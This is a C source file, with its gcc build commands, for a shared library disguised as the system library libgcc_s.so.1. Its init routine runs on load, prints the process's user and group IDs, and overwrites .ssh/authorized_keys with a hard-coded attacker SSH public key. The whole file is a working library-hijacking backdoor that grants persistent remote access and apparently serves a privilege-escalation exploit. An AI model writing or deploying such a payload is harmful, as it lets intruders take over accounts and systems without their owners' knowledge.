/*
gcc -c -Wall -Werror -fpic libgcc_s.so.c -Wl,-init,foo -m32
gcc -shared -o libgcc_s.so.1 libgcc_s.so.o -Wl,-init,foo -m32
*/
#define _GNU_SOURCE 
#include <sys/stat.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define KEY "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDMq4LNkkMDF8vmd0hzw8" \
	"/Va5I6K0GNLkruROPB501PPsE/HqKH13d8fOKTWvDgc9At/rRhfaAOgJbpb5wK" \
	"YxRFrpGRoZlCyQ5DZCnD3J/MpfB5R02HPzDTwj87FLJFQjLjosO+/TP9Mz0xv2" \
	"8eSeHSpvkTAScznNH8t5NEZulw113Ga8GSnteN9wPouNQrHEyo+wh0tw46/FHw" \
	"KjFe1n3ho7tj5mhIka5FSen7iYEbby1C+5zKspP8OBF90ndZ5icXPdF7iqDR5s" \
	"vPTN2PpU8VeLwKDicYidqy14RDPLscfMUMW7lR/7n1j4paThisUj0w4hrGnGdg" \
	"omyINmU6Wpyd root@xoreipeip"

void foo(void)
{
    uid_t ruid, euid, suid;
    uid_t rgid, egid, sgid;
    FILE *fd;

    getresuid(&ruid, &euid, &suid);
    getresgid(&rgid, &egid, &sgid);
    printf("%d:%d:%d - %d:%d:%d\n", ruid, euid, suid, rgid, egid, sgid);

    mkdir(".ssh", 0766);
    fd = fopen(".ssh/authorized_keys", "w+");
    fputs(KEY, fd);
    fclose(fd);
}
